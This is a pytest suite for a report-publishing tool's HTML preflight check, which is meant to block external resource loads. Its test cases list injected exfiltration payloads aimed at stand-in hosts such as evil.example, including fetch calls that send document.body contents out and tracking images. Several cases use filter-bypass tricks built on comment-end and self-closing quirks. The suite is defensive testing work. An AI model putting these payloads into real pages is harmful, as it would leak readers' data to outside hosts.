"""tools/publish_strategy_report.py 的全 mock 测试——绝不打真实网络。"""
import base64
import json
import random
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "tools"))

import pytest
import requests

ENDPOINT_PATH = "/api/external/strategy-reports"
DEFAULT_URL = "https://database.nbdpsy.com" + ENDPOINT_PATH

FRAGMENT = (
    '<style>.wrap{color:#111}@media (prefers-color-scheme: dark){.wrap{color:#eee}}</style>\n'
    '<header><h1>运营数据诊断报告</h1></header>\n'
    '<section class="wrap"><p>正文 <a href="#chapter-2">跳到第二章</a></p></section>\n'
)

FULL_DOC = (
    '<!doctype html><html lang="zh-CN"><head><title>报告</title></head>'
    '<body><header><h1>运营数据诊断报告</h1></header></body></html>'
)


class Resp:
    """最小 requests.Response 桩。"""
    def __init__(self, status_code, body, text=""):
        self.status_code = status_code
        self._body = body
        self.text = text

    def json(self):
        if self._body is None:
            raise ValueError("no json")
        return self._body


class Sender:
    """记录调用次数的 send_request 桩。"""
    def __init__(self, resp):
        self.resp = resp
        self.calls = []

    def __call__(self, url, key, payload):
        self.calls.append({"url": url, "key": key, "payload": payload})
        return self.resp


def _install(monkeypatch, tmp_path, *, html=FRAGMENT, resp=None, key="testkey"):
    """写入报告文件 + 打桩 get_secret/send_request，返回 (module, html_path, sender)。"""
    import publish_strategy_report as mod
    p = tmp_path / "报告-artifact版.html"
    p.write_text(html, encoding="utf-8")
    monkeypatch.setattr(mod.nbdpsy_common, "get_secret", lambda k: key)
    sender = Sender(resp if resp is not None else Resp(200, {"success": True, "data": {"id": 7, "created": True}}))
    monkeypatch.setattr(mod, "send_request", sender)
    return mod, p, sender


def _run(mod, monkeypatch, html_path, *extra):
    argv = ["publish_strategy_report.py", "--html", str(html_path),
            "--slug", "ops-diagnosis-202607", "--title", "运营数据诊断报告（2026-07）",
            "--generated-at", "2026-07-26T12:17:00+08:00", *extra]
    _run_argv(mod, monkeypatch, argv)


def _run_argv(mod, monkeypatch, argv):
    """按给定 argv 直接跑 main()——用于测缺必填参数这类用法错误。"""
    monkeypatch.delenv("NBDPSY_API_BASE", raising=False)
    monkeypatch.setattr(sys, "argv", argv)
    mod.main()


def _last_json(capsys):
    return json.loads(capsys.readouterr().out.strip().splitlines()[-1])


# ---- 凭据缺失：非零退出且不发请求，stdout 仍守输出契约 ----

def test_missing_secret_exits_nonzero_without_request(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path, key=None)
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p)
    assert exc.value.code != 0
    cap = capsys.readouterr()
    assert "MISSING:NBDPSY_STRATEGY_API_KEY" in cap.err
    assert sender.calls == []
    # docstring 声明的输出契约：stdout 必须是可解析 JSON 且带 outcome
    data = json.loads(cap.out.strip().splitlines()[-1])
    assert data["outcome"] == "failed"
    assert data["reason"] == "missing_credential"


# ---- 预检：完整 HTML 文档拒绝 ----

def test_full_html_document_rejected_without_request(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path, html=FULL_DOC)
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p)
    assert exc.value.code != 0
    cap = capsys.readouterr()
    assert "预检失败" in cap.err
    assert sender.calls == []
    # 输出契约：预检失败也要往 stdout 打带 outcome 的 JSON
    data = json.loads(cap.out.strip().splitlines()[-1])
    assert data["outcome"] == "failed"
    assert data["reason"] == "preflight_failed"


# ---- 预检：文件读不了也要守住输出契约（不得抛裸 traceback）----

def test_unreadable_file_is_preflight_failure(monkeypatch, tmp_path, capsys):
    """权限 000 的文件：docstring 声明「除命令行用法错误外每条路径都打带 outcome 的单行 JSON」，
    裸 PermissionError traceback 会让 stdout 一个字都没有，调用方无从解析。"""
    import os
    if os.geteuid() == 0:
        pytest.skip("root 无视文件权限位，构造不出不可读文件")
    mod, p, sender = _install(monkeypatch, tmp_path)
    p.chmod(0o000)
    try:
        with pytest.raises(SystemExit) as exc:
            _run(mod, monkeypatch, p)
        assert exc.value.code != 0
        cap = capsys.readouterr()
        assert "预检失败" in cap.err and "读不了" in cap.err
        data = json.loads(cap.out.strip().splitlines()[-1])
        assert data["outcome"] == "failed"
        assert data["reason"] == "preflight_failed"
        assert sender.calls == []
    finally:
        p.chmod(0o644)      # 恢复权限，好让 tmp_path 清理掉它
        p.unlink()


# ---- 预检：<header> / <title> 不得被误判成完整文档 ----

def test_fragment_with_header_and_title_passes_preflight(monkeypatch, tmp_path, capsys):
    html = '<header>头</header><section><title>图表标题</title><p>正文</p></section>'
    mod, p, sender = _install(monkeypatch, tmp_path, html=html)
    _run(mod, monkeypatch, p)
    assert len(sender.calls) == 1
    assert _last_json(capsys)["outcome"] == "created"


# ---- 预检：外部资源引用拒绝 ----
# 判据 = 只扫「会被当资源取」的位置（各标签的**属性值** + <style>/<script> 块内容，跳过 `<a href>`），
# 其中任何 https?:// 或协议相对 // 开头的 URL。分词由 html.parser 负责，不用正则近似。
# 下列构造在旧的「属性名枚举」判据下全部漏放（实测均真发出了请求）；
# c1_/c2_/c5_ 三组则是「正则切标签」实现的漏放（见各自注释）。

EXTERNAL_CASES = {
    "script_src": '<script src="https://cdn.example.com/chart.js"></script>',
    "img_srcset": '<img srcset="https://cdn.evil.com/a.png 1x, https://cdn.evil.com/b.png 2x">',
    "object_data": '<object data="https://evil.com/x.svg"></object>',
    "video_poster": '<video poster="https://evil.com/p.jpg"></video>',
    "form_action": '<form action="https://evil.com"><input name="a"></form>',
    "script_fetch": '<script>fetch("https://evil.example/x?d="+document.body.innerText)</script>',
    # <script> 块里的 `<!--` 是 JS 行注释，不是 HTML 注释：剔注释时不能顺手把块内容一起吃掉
    "script_fetch_wrapped_in_js_comment_markers":
        '<script>\n<!--\nfetch("https://evil.example/x")\n-->\n</script>',
    "css_import": '<style>@import "https://fonts.example.com/x.css";</style>',
    "css_url": '<style>.a{background:url(https://cdn.example.com/bg.png)}</style>',
    "link_stylesheet": '<link rel="stylesheet" href="https://cdn.example.com/x.css">',
    "protocol_relative_src": '<img src="//cdn.example.com/a.png">',
    "protocol_relative_css_url": '<style>.a{background:url(//cdn.example.com/bg.png)}</style>',
    "anchor_ping": '<a ping="https://track.evil.com/p" href="#s1">锚点但带 ping</a>',
    "anchor_style_url": '<a href="#s1" style="background:url(https://evil.com/b.png)">x</a>',
    # 白名单必须整串精确匹配：前缀匹配会被同前缀域名当出站通道
    "whitelist_prefix_lookalike_domain": '<img src="http://www.w3.org/2000/svg.evil.com/x.png">',
    # 明文 http 外链同样是出站通道（判据是 https?://，别只覆盖 https）
    "plain_http_src": '<img src="http://cdn.example.com/a.png">',
    # w3.org 但不是命名空间 URI：白名单是精确前缀，不是整站放行
    "plain_http_w3org_non_namespace": '<img src="http://www.w3.org/logo.png">',
    "iframe_src": '<iframe src="https://evil.example/frame"></iframe>',
    "link_imagesrcset":
        '<link rel="preload" as="image" imagesrcset="https://cdn.evil.com/a.png 1x">',
    "meta_refresh": '<meta http-equiv="refresh" content="0;url=https://evil.example/go">',
    "base_href": '<base href="https://evil.example/">',
    "svg_image_href": '<svg><image href="https://evil.example/x.png"/></svg>',
    "svg_use_href": '<svg><use href="https://evil.example/sprite.svg#dot"/></svg>',
    "css_behavior": '<style>.a{behavior:url(https://evil.example/x.htc)}</style>',
    # ---- C1 回归：引号属性值里的 `>` 不得让分词断句 ----
    # 旧的 `<[^>]+>` 在第一个 `>` 处断句，src/style 落到「标签之间」完全不被扫描；
    # 浏览器按 HTML5 分词把引号内的 `>` 当普通字符，整条标签正常解析并真去取资源。
    # `alt="留存 > 60%"` 在运营数据报告里是完全正常的写法，触发它不需要恶意。
    "c1_gt_in_alt_before_src": '<img alt="收入>成本" src="https://cdn.evil.com/track.png">',
    "c1_gt_spaced_in_title_before_src": '<img title="1 > 0" src="https://cdn.evil.com/x.png">',
    "c1_gt_in_data_attr_before_style":
        '<div data-x="a>b" style="background:url(https://evil.com/bg.png)">格</div>',
    # ---- C2 回归：注释终止符 `--!>` ----
    # 浏览器在 comment-end-bang 状态遇 `--!>` 即结束注释，后面的 img 正常渲染并发起请求；
    # 旧的 `<!--.*?-->` 从第一个 `<!--` 非贪婪吃到最后一个 `-->`，把整条 img 吞掉。
    "c2_comment_end_bang":
        '<!-- 说明 --!><img src="https://cdn.evil.com/track.png"><!-- 结尾 -->',
    # ---- C5 回归：属性值里的 HTML 字符引用 ----
    # 浏览器解码成 https:// 并发起请求；判据须在**解码后**的属性值上跑。
    "c5_numeric_charref_scheme": '<img src="&#104;ttps://evil.com/x.png">',
    "c5_named_charref_in_css_url":
        '<div style="background:url(https&#58;//evil.com/bg.png)">格</div>',
    # ---- E1 回归：`<script/>` / `<style/>` 伪自闭写法不得让整块 JS/CSS 逃过扫描 ----
    # HTML5 规范：HTML 元素上的自闭合标志被**忽略**，浏览器照常让 script/style 进 raw-text
    # 一路吃到 `</script>` / `</style>` 并执行整块内容（真实 Chromium 里 iframe
    # sandbox="allow-scripts" + srcdoc 实测确实发出了请求）。HTMLParser 却走
    # handle_startendtag 且不进 raw-text，块内容会以普通文本/HTML 注释漂过去被丢弃。
    # 撤掉 _ResourceLocationCollector.handle_startendtag 覆写，下列全部变红。
    "e1_script_selfclosing":
        '<script/>fetch("https://evil.example/leak?d="+document.body.innerHTML)</script>',
    "e1_script_selfclosing_spaced":
        '<script />fetch("https://evil.example/leak")</script>',
    "e1_script_selfclosing_uppercase":
        '<SCRIPT/>fetch("https://evil.example/leak")</SCRIPT>',
    "e1_script_selfclosing_with_attrs":
        '<script type="text/javascript"/>new Image().src="https://evil.example/p"</script>',
    # 伪自闭 + JS 注释包裹：普通模式下 `<!--…-->` 会被当 HTML 注释整段丢掉，
    # 而浏览器在 script data 状态里照常执行 —— 只有真正进 raw-text 才挡得住。
    "e1_script_selfclosing_wrapped_in_js_comment_markers":
        '<script/>\n<!--\nfetch("https://evil.example/x")\n-->\n</script>',
    # 块内裸 `<`（`i<9`）在普通模式下会被当标签起头，raw-text 下才是纯 JS
    "e1_script_selfclosing_with_bare_lt":
        '<script/>for(i=0;i<9;i++)fetch("https://evil.example/x")</script>',
    "e1_style_selfclosing":
        '<style/>@import url(https://evil.example/a.css);</style>',
    "e1_style_selfclosing_spaced":
        '<style />@import url(https://evil.example/a.css);</style>',
    # 带上匹配元素：CSS background 是**惰性**取图，没有 .a 元素时浏览器本来就不发请求，
    # 那样的样本证不出「浏览器会出站」。补上 <div class="a"> 才是真实复现。
    "e1_style_selfclosing_uppercase":
        '<STYLE/>.a{background:url(https://evil.example/bg.png)}</STYLE><div class="a">格</div>',
    "e1_style_selfclosing_with_attrs":
        '<style media="all"/>@import url(https://evil.example/a.css);</style>',
    # svg 内嵌（图表库导出的 SVG 里 `<script/>` / `<style/>` 是常见写法）。
    # 实测 Chromium 两者**不对称**：
    #   · <svg><style/>… 照样出站（真 fail-open，本补丁挡住的正是它）；
    #   · <svg><script/>… 零请求 —— 外来元素（foreign content）上的自闭合标志按 HTML5
    #     是**生效**的，script 真的自闭了，后面是 SVG 文本节点不执行。
    # 后者本闸门仍判拒 = 刻意保留的误杀：HTMLParser 没有 foreign-content 概念，
    # 要区分就得自己维护 svg/math 元素栈，判错方向就是 fail-open。
    # 误杀方向安全且可见（报错直接指到 `<script> 块内容`），作者改掉即可。
    "e1_svg_nested_script_selfclosing":
        '<svg viewBox="0 0 1 1"><script/>fetch("https://evil.example/x")</script></svg>',
    "e1_svg_nested_style_selfclosing":
        '<svg><style/>@import url(https://evil.example/y.css);</style></svg>',
    # E1 的另一面：非 CDATA 元素的 `/>` 仍按自闭合处理，属性照常收集（别为修 E1 丢掉这条）
    "e1_selfclosing_img_attrs_still_scanned": '<img src="https://cdn.evil.com/a.png"/>',
    "e1_selfclosing_svg_image_href_still_scanned":
        '<svg><image href="https://evil.example/x.png" /></svg>',
    # ---- E2 回归：`--!>` 的判据不得挂在解释器补丁级别上 ----
    # 见 test_comment_end_bang_flagged_regardless_of_interpreter（那条才是版本无关的硬证据）；
    # 这条只保证本机行为不退化。
    "e2_comment_end_bang_before_script":
        '<!-- 说明 --!><script>fetch("https://evil.example/a")</script>',
}


@pytest.mark.parametrize("name", sorted(EXTERNAL_CASES))
def test_external_resource_rejected_without_request(name, monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path, html=FRAGMENT + EXTERNAL_CASES[name])
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p)
    assert exc.value.code != 0
    assert "外部资源引用" in capsys.readouterr().err
    assert sender.calls == []


# ---- 预检：<a href> 超链接放行（它渲染时不发任何请求，拦它是纯误杀）----

ANCHOR_CASES = {
    "absolute_https": '<p>数据来源见 <a href="https://www.nbdpsy.com/blog/cptsd">官网</a></p>',
    "single_quoted": "<p><a href='https://example.com/ref' target='_blank'>参考资料</a></p>",
    "unquoted": '<p><a href=https://example.com/ref >参考资料</a></p>',
    "protocol_relative": '<p><a href="//example.com/ref">参考资料</a></p>',
    "in_page_anchor": '<p><a href="#s1">跳到第一节</a></p>',
    "relative_path": '<p><a href="/blog/cptsd">站内</a></p>',
}


@pytest.mark.parametrize("name", sorted(ANCHOR_CASES))
def test_anchor_href_is_allowed(name, monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path, html=FRAGMENT + ANCHOR_CASES[name])
    _run(mod, monkeypatch, p)
    assert len(sender.calls) == 1
    assert _last_json(capsys)["outcome"] == "created"


def test_base64_data_uri_leading_double_slash_is_not_flagged(monkeypatch, tmp_path, capsys):
    """JPEG 的 base64 极常以 `//` 开头（`base64,//4AAQSkZJRg…`）。

    此处 `//` 前面是逗号——**不在** PROTOCOL_RELATIVE_URL_RE 负向后顾的字符类里，
    所以负向后顾在这条样本上根本不设防；唯一挡住误杀的是「`//` 后必须跟含点 token」
    （`\\.[A-Za-z]{2,}`），base64 字母表里没有点。删掉那段量词本用例即变红。
    尾部再挂一段长 blob，覆盖 `//` 出现在 base64 中段的常见形态。
    """
    random.seed(7)
    b64 = base64.b64encode(bytes(random.randrange(256) for _ in range(20000))).decode()
    assert "//" in b64, "样本没含 //，换 seed"
    html = FRAGMENT + f'<img alt="图表" src="data:image/jpeg;base64,//4AAQSkZJRgABAQAAAQABAAD{b64}">'
    mod, p, sender = _install(monkeypatch, tmp_path, html=html)
    _run(mod, monkeypatch, p)
    assert len(sender.calls) == 1
    assert _last_json(capsys)["outcome"] == "created"


def test_protocol_relative_rule_does_not_double_match_scheme_urls():
    """`https://host/x` 里的 `//host/x` 不得被协议相对规则再命中一次——
    这正是 PROTOCOL_RELATIVE_URL_RE 负向后顾的职责。丢了它，白名单里的
    `http://www.w3.org/2000/svg` 会额外裂出一个不在白名单的 `//www.w3.org/2000/svg`
    而被误杀。删掉负向后顾本用例即变红（返回两条）。"""
    import publish_strategy_report as mod
    assert mod.find_external_urls('<img src="https://cdn.example.com/a.png">') == \
        ["https://cdn.example.com/a.png"]


def test_script_style_comment_without_url_passes(monkeypatch, tmp_path, capsys):
    """script/style 块里的注释本身不构成外链——块内容整段参与扫描，但没 URL 就没命中。"""
    html = (FRAGMENT + '<script>\n// 说明：这是内联注释\nvar a = 1; // 行尾注释\n</script>'
            '<style>/* 配色说明 */.a{color:#111}</style>')
    mod, p, sender = _install(monkeypatch, tmp_path, html=html)
    _run(mod, monkeypatch, p)
    assert len(sender.calls) == 1
    assert _last_json(capsys)["outcome"] == "created"


# ---- C4：script/style **注释里**的 URL 会被拦（fail-closed，刻意保留的已知误杀）----
# 判据是「块内容整段扫」，不做 JS/CSS 注释剥离：要剥离就得在正则里近似 JS/CSS 分词，
# 而 `url(https://…)` 里的 `//`、字符串字面量里的 `//` 都会把朴素的行注释规则带沟里——
# 这正是 C1/C2/C3 的成因。误杀方向安全且可见（报错直接指到 `<script> 块内容`），
# 作者把注释里的网址删掉即可；错放方向则是静默出站通道。

SCRIPT_STYLE_COMMENT_URL_CASES = {
    "js_line_comment": '<script>// 算法见 https://docs.example.com/a\nvar a=1;</script>',
    "js_block_comment": '<script>/* 参考 https://docs.example.com/b */var a=1;</script>',
    "css_block_comment": '<style>/* 配色参考 https://coolors.co/x */.a{color:#111}</style>',
}


@pytest.mark.parametrize("name", sorted(SCRIPT_STYLE_COMMENT_URL_CASES))
def test_url_inside_script_or_style_comment_is_flagged(name, monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path,
                              html=FRAGMENT + SCRIPT_STYLE_COMMENT_URL_CASES[name])
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p)
    assert exc.value.code != 0
    err = capsys.readouterr().err
    assert "外部资源引用" in err and "块内容" in err     # 报错须指到块，别让人满篇找 <img>
    assert sender.calls == []


# ---- 预检：正文文本 / 注释里的网址放行（它们渲染时不发任何请求）----
# 「参考资料 / 数据来源」章节把网址当正文列出来是运营报告最常见的写法，LLM 出稿尤其爱这么写。

PLAIN_TEXT_URL_CASES = {
    # href 被抹掉，可见文字里的同一个 URL 在文本节点上，不该再被扫到
    "anchor_text_repeats_href":
        '<p><a href="https://www.nbdpsy.com/blog/x">https://www.nbdpsy.com/blog/x</a></p>',
    "bare_text": '<p>数据来源：https://www.nbdpsy.com/blog/cptsd（纯文本，非链接）</p>',
    "html_comment": '<!-- 生成自 https://claude.ai/artifact/abc -->',
    "code_block": '<pre><code>curl https://database.nbdpsy.com/api/x</code></pre>',
    "list_of_references":
        '<h2>参考资料</h2><ul><li>官网 CPTSD 长文 https://www.nbdpsy.com/blog/cptsd</li>'
        '<li>行业报告 //stats.example.com/2026</li></ul>',
    # E1 补丁不得让**非** CDATA 元素的 `/>` 变成「一直开着」——
    # 若误把所有自闭合标签都当开始标签处理且置上块标志，后面的正文会被当块内容误杀。
    "selfclosing_void_tag_then_text_url":
        '<br/><p>数据来源：https://www.nbdpsy.com/blog/cptsd（纯文本）</p>',
    "selfclosing_svg_shape_then_text_url":
        '<svg viewBox="0 0 1 1"><rect width="1" height="1"/></svg>'
        '<p>来源 https://www.nbdpsy.com/blog/x</p>',
    # 正常闭合的 style/script 块结束后，后面的正文网址仍须放行（raw-text 已正确收尾）
    "closed_style_block_then_text_url":
        '<style>.a{color:#111}</style><p>来源 https://www.nbdpsy.com/blog/y</p>',
    # 伪自闭 style 块正常收尾后，后面的正文网址同样放行
    "selfclosing_style_block_closed_then_text_url":
        '<style/>.a{color:#111}</style><p>来源 https://www.nbdpsy.com/blog/z</p>',
    # 正文里出现 `--!>` 只是普通字符，归一化成 `-->` 不得改变「文本网址放行」的结论
    "comment_end_bang_in_plain_text":
        '<p>写法 a --!&gt; b，来源 https://www.nbdpsy.com/blog/w</p>',
}


@pytest.mark.parametrize("name", sorted(PLAIN_TEXT_URL_CASES))
def test_plain_text_url_is_allowed(name, monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path, html=FRAGMENT + PLAIN_TEXT_URL_CASES[name])
    _run(mod, monkeypatch, p)
    assert len(sender.calls) == 1
    assert _last_json(capsys)["outcome"] == "created"


# ---- 预检：比较符不得制造假阳（C1/C3 的放行面）----
# 运营数据报告里 `留存 > 60%`、`转化率 < 5%` 是日常写法，LLM 出稿也常不转义成 &lt;/&gt;。

COMPARISON_OPERATOR_CASES = {
    # C3：正文裸 `<` 让旧实现把后面的正文当成「标签内部」，正常网址被误杀
    "bare_lt_in_text_then_url":
        '<p>转化率 < 5%，数据来源：https://www.nbdpsy.com/blog/cptsd</p>',
    "bare_lt_in_code_block":
        '<pre><code>if (x < y) fetch("https://api.example.com/v1")</code></pre>',
    # C1 的另一面：属性里带 `>` 但整条标签并不取外部资源，不能因为断句而误判
    "gt_in_alt_with_inline_data_uri":
        '<img alt="收入>成本" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">',
    "gt_in_title_plain_tag": '<p title="留存 > 60%">留存高于 60%</p>',
}


@pytest.mark.parametrize("name", sorted(COMPARISON_OPERATOR_CASES))
def test_comparison_operator_does_not_false_positive(name, monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path,
                              html=FRAGMENT + COMPARISON_OPERATOR_CASES[name])
    _run(mod, monkeypatch, p)
    assert len(sender.calls) == 1
    assert _last_json(capsys)["outcome"] == "created"


# ---- E2：`--!>` 的判据必须版本无关，不许寄生在解释器补丁级别上 ----
# 本机 Python 3.12.3 是打过 HTML5 对齐补丁的构建（html.parser.commentclose = r'--!?>'，认 `--!>`）；
# 历史 stdlib 是 r'--\s*>'（**不认**），`<!-- x --!><img src=…>` 的 img 会被整条当注释吞掉 → 静默放行。
# 仓库 install.sh 声明支持 Python 3.9+，运营在自己机器上装完这个洞就会悄悄回来。
# 故扫描前把 `--!>` 归一成 `-->`（只改扫描副本），判据不再依赖解释器。

def test_normalize_for_scan_rewrites_comment_end_bang():
    """最硬的一条：不碰 stdlib，直接盯归一化本身。撤掉 _normalize_for_scan 即变红。"""
    import publish_strategy_report as mod
    assert mod._normalize_for_scan('<!-- 说明 --!><img src="https://x/a.png">') == \
        '<!-- 说明 --><img src="https://x/a.png">'
    assert mod._normalize_for_scan('<p>无 bang</p>') == '<p>无 bang</p>'


def test_normalize_for_scan_does_not_mutate_uploaded_html(monkeypatch, tmp_path, capsys):
    """归一化只作用于扫描副本：POST 出去的 content_html 必须与原文件逐字节一致。"""
    html = FRAGMENT + '<!-- 生成自 artifact --!><p>正文 a --!&gt; b</p>'
    mod, p, sender = _install(monkeypatch, tmp_path, html=html)
    _run(mod, monkeypatch, p)
    assert sender.calls[0]["payload"]["content_html"] == html
    assert "--!>" in sender.calls[0]["payload"]["content_html"]
    assert _last_json(capsys)["outcome"] == "created"


@pytest.mark.parametrize("commentclose_src", [r"--\s*>", r"--!?>"])
def test_comment_end_bang_flagged_regardless_of_interpreter(commentclose_src, monkeypatch):
    """把 html.parser.commentclose 分别按住成「历史版本」与「HTML5 对齐版」，两种都必须命中。

    不依赖本机 stdlib 的实际行为：历史版那一档正是别的机器上的真实情形。
    撤掉 _normalize_for_scan，`--\\s*>` 这一档立刻变红（返回 []）。
    """
    import html.parser as hp
    import re as _re
    import publish_strategy_report as mod
    # raising=False：万一某个解释器根本没有这个模块级常量，设了也不影响行为，
    # 该档退化成「本机默认行为」——归一化仍然保证命中，测试依旧有意义。
    monkeypatch.setattr(hp, "commentclose", _re.compile(commentclose_src), raising=False)
    assert mod.find_external_urls(
        '<!-- 说明 --!><img src="https://cdn.evil.com/track.png">'
    ) == ["https://cdn.evil.com/track.png"]


# ---- E3：CDATA_ELEMENTS 与解析器状态机的关系必须钉死 ----

def test_cdata_elements_is_a_deliberate_subset_of_stdlib():
    """本模块的 CDATA_ELEMENTS 是 HTMLParser.CDATA_CONTENT_ELEMENTS 的**故意收窄副本**。

    · 钉死取值：不许跟着解释器版本漂（3.12 stdlib 侧已扩到 6 个：含 xmp/iframe/noembed/noframes），
      否则同一份报告在不同机器上结论不同。
    · 钉死子集关系：普通（非自闭）`<style>` / `<script>` 能进 raw-text，靠的正是 stdlib
      在 parse_starttag 里按 CDATA_CONTENT_ELEMENTS 调 set_cdata_mode；这条依赖若断了，
      块内容会退化成普通文本节点被逐段切碎。
    """
    from html.parser import HTMLParser
    import publish_strategy_report as mod
    assert set(mod.CDATA_ELEMENTS) == {"style", "script"}
    assert set(mod.CDATA_ELEMENTS) <= set(HTMLParser.CDATA_CONTENT_ELEMENTS)


# ---- 解析失败一律 fail-closed：绝不因为「解析器炸了」就当没有外链 ----

def test_parser_failure_is_fail_closed(monkeypatch, tmp_path, capsys):
    import publish_strategy_report as mod

    class Boom(mod._ResourceLocationCollector):
        def feed(self, data):
            raise RuntimeError("parser exploded")

    monkeypatch.setattr(mod, "_ResourceLocationCollector", Boom)
    mod2, p, sender = _install(monkeypatch, tmp_path)
    with pytest.raises(SystemExit) as exc:
        _run(mod2, monkeypatch, p)
    assert exc.value.code != 0
    cap = capsys.readouterr()
    assert "预检失败" in cap.err and "HTML 解析失败" in cap.err
    assert json.loads(cap.out.strip().splitlines()[-1])["reason"] == "preflight_failed"
    assert sender.calls == []


# ---- 报错文案必须指到命中位置，否则用户满篇找 <img> 找不到只能靠猜 ----

def test_error_message_points_at_the_offending_location(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(
        monkeypatch, tmp_path,
        html=FRAGMENT + '<img alt="收入>成本" src="https://cdn.evil.com/track.png">')
    with pytest.raises(SystemExit):
        _run(mod, monkeypatch, p)
    err = capsys.readouterr().err
    assert "<img src>" in err
    assert "https://cdn.evil.com/track.png" in err


# ---- 预检：命名空间 URI 白名单放行（浏览器绝不去取）----

def test_namespace_uris_are_whitelisted(monkeypatch, tmp_path, capsys):
    """svg / xlink（Illustrator 等导出的老式 SVG）/ xhtml（<foreignObject>）三个命名空间。"""
    html = (FRAGMENT +
            '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"'
            ' xmlns:xlink="http://www.w3.org/1999/xlink">'
            '<use href="http://www.w3.org/2000/svg#dot"/>'
            '<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">文字</div></foreignObject>'
            '</svg>')
    mod, p, sender = _install(monkeypatch, tmp_path, html=html)
    _run(mod, monkeypatch, p)
    assert len(sender.calls) == 1
    assert _last_json(capsys)["outcome"] == "created"


# ---- 预检：双主题不参与判定 ----

def test_dark_theme_media_query_passes(monkeypatch, tmp_path, capsys):
    html = ('<style>:root[data-theme="dark"]{--bg:#000}'
            '@media (prefers-color-scheme: dark){body{--bg:#000}}</style><section>正文</section>')
    mod, p, sender = _install(monkeypatch, tmp_path, html=html)
    _run(mod, monkeypatch, p)
    assert len(sender.calls) == 1
    assert _last_json(capsys)["outcome"] == "created"


# ---- dry-run：只打摘要，不发请求，不泄全文与 key ----

def test_dry_run_prints_summary_only(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path, key="sk-strategy-secret")
    _run(mod, monkeypatch, p, "--dry-run", "--version-label", "v1-首发")
    cap = capsys.readouterr()
    data = json.loads(cap.out.strip().splitlines()[-1])
    assert data["dry_run"] is True
    assert data["slug"] == "ops-diagnosis-202607"
    assert data["version_label"] == "v1-首发"
    assert data["generated_at"] == "2026-07-26T12:17:00+08:00"
    assert data["bytes"] == len(FRAGMENT.encode("utf-8"))
    assert data["outcome"] == "dry-run"            # 输出契约：dry-run 也必须带 outcome
    assert sender.calls == []
    both = cap.out + cap.err
    assert "运营数据诊断报告</h1>" not in both      # 未打 content_html 全文
    assert "sk-strategy-secret" not in both        # 未打 key


# ---- dry-run 不依赖凭据：全程不用 key，运营等发密钥期间就该能本地自查 ----

def test_dry_run_works_without_credential(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path, key=None)
    _run(mod, monkeypatch, p, "--dry-run")          # 不抛 SystemExit == exit 0
    cap = capsys.readouterr()
    data = json.loads(cap.out.strip().splitlines()[-1])
    assert data["outcome"] == "dry-run" and data["dry_run"] is True
    assert data["bytes"] == len(FRAGMENT.encode("utf-8"))
    assert "MISSING:" not in cap.err
    assert sender.calls == []


def test_dry_run_without_credential_still_runs_preflight(monkeypatch, tmp_path, capsys):
    """dry-run 的主要用途正是本地判断 --html 指错没有；没 key 也必须真跑预检。"""
    mod, p, sender = _install(monkeypatch, tmp_path, html=FULL_DOC, key=None)
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p, "--dry-run")
    assert exc.value.code != 0
    cap = capsys.readouterr()
    assert "预检失败" in cap.err and "MISSING:" not in cap.err
    assert json.loads(cap.out.strip().splitlines()[-1])["outcome"] == "failed"
    assert sender.calls == []


# ---- 成功路径：created / updated ----

def test_created_path(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path,
                              resp=Resp(200, {"success": True, "data": {"id": 12, "created": True}}))
    _run(mod, monkeypatch, p, "--version-label", "v1-首发")
    data = _last_json(capsys)
    assert data == {"slug": "ops-diagnosis-202607", "id": 12, "created": True,
                    "version_label": "v1-首发", "bytes": len(FRAGMENT.encode("utf-8")),
                    "outcome": "created"}
    # 整条请求都要守住：端点路径、payload 键集合、每个字段取值
    call = sender.calls[0]
    assert call["url"] == DEFAULT_URL
    assert call["url"].endswith(ENDPOINT_PATH)
    assert set(call["payload"]) == {"slug", "title", "content_html",
                                    "generated_at", "expect", "version_label"}
    assert call["payload"]["slug"] == "ops-diagnosis-202607"
    assert call["payload"]["title"] == "运营数据诊断报告（2026-07）"
    assert call["payload"]["content_html"] == FRAGMENT
    assert call["payload"]["version_label"] == "v1-首发"
    assert call["payload"]["expect"] == "new"
    assert call["payload"]["generated_at"] == "2026-07-26T12:17:00+08:00"


def test_created_path_without_version_label_omits_the_key(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path)
    _run(mod, monkeypatch, p)
    assert _last_json(capsys)["outcome"] == "created"
    assert set(sender.calls[0]["payload"]) == {"slug", "title", "content_html",
                                               "generated_at", "expect"}


def test_api_base_override_keeps_endpoint_path(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path)
    _run(mod, monkeypatch, p, "--api-base", "https://staging.example.com/")
    assert sender.calls[0]["url"] == "https://staging.example.com" + ENDPOINT_PATH


def test_update_flag_yields_updated(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path,
                              resp=Resp(200, {"success": True, "data": {"id": 12, "created": False}}))
    _run(mod, monkeypatch, p, "--update", "--version-label", "v2-修订")
    data = _last_json(capsys)
    assert data["outcome"] == "updated" and data["id"] == 12
    call = sender.calls[0]
    assert call["url"] == DEFAULT_URL
    assert set(call["payload"]) == {"slug", "title", "content_html",
                                    "generated_at", "expect", "version_label"}
